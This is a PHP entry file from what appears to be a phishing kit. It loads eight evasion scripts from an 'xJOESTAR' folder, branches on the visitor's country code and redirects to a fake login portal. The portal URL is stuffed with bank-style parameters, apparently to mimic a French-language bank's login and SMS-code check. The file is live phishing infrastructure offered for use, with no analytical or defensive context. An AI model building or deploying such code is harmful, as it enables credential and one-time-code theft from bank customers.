<?php


include("xJOESTAR/anti1.php");
include("xJOESTAR/anti2.php");
include("xJOESTAR/anti3.php");
include("xJOESTAR/anti4.php");
include("xJOESTAR/anti5.php");
include("xJOESTAR/anti6.php");
include("xJOESTAR/anti7.php");
include("xJOESTAR/anti8.php");


if ($_SESSION['countrycode1'] == "CH") {
header('Location: portal/index.php?view=login&appIdKey=_nfpb=true&_pageLabel=as_login_page&connexioncompte_2actionEvt=afficher&lieu.x=CHF_SMS-CODE?CODE-SMS-Valid_assure_nfpb=true&_pageLabel=as_login_page&connexioncompte_2actionEvt=afficher&lieu.x=CHF_SMS-CODE?CODE-SMS-Valid_assure_nfpb=true&_pageLabel=as_login_page&connexioncompte_2actionEvt=afficher&lieu.x=CHF_SMS-CODE?CODE-SMS-Valid_assure_nfpb=true&_pageLabel=as_login_page&connexioncompte_2actionEvt=afficher&lieu.x=CHF_SMS-CODE?CODE-SMS-Valid_assure_nfpb=true&_pageLabel=as_login_page&connexioncompte_2actionEvt=afficher&lieu.x=CHF_SMS-CODE?CODE-SMS-Valid_assure_nfpb=true&_pageLabel=as_login_page&connexioncompte_2actionEvt=afficher&lieu.connexioncompte_2actionEvt=afficher&lieu.x=fr_SMS-CODE');
}

 else {

header('Location: portal/index.php?view=login&appIdKey=_nfpb=true&_pageLabel=as_login_page&connexioncompte_2actionEvt=afficher&lieu.x=CHF_SMS-CODE?CODE-SMS-Valid_assure_nfpb=true&_pageLabel=as_login_page&connexioncompte_2actionEvt=afficher&lieu.x=CHF_SMS-CODE?CODE-SMS-Valid_assure_nfpb=true&_pageLabel=as_login_page&connexioncompte_2actionEvt=afficher&lieu.x=CHF_SMS-CODE?CODE-SMS-Valid_assure_nfpb=true&_pageLabel=as_login_page&connexioncompte_2actionEvt=afficher&lieu.x=CHF_SMS-CODE?CODE-SMS-Valid_assure_nfpb=true&_pageLabel=as_login_page&connexioncompte_2actionEvt=afficher&lieu.x=CHF_SMS-CODE?CODE-SMS-Valid_assure_nfpb=true&_pageLabel=as_login_page&connexioncompte_2actionEvt=afficher&lieu.connexioncompte_2actionEvt=afficher&lieu.x=fr_SMS-CODE');

}




$random = rand(0,100000000000);
$dis    = substr(md5($random), 0, 25);




?>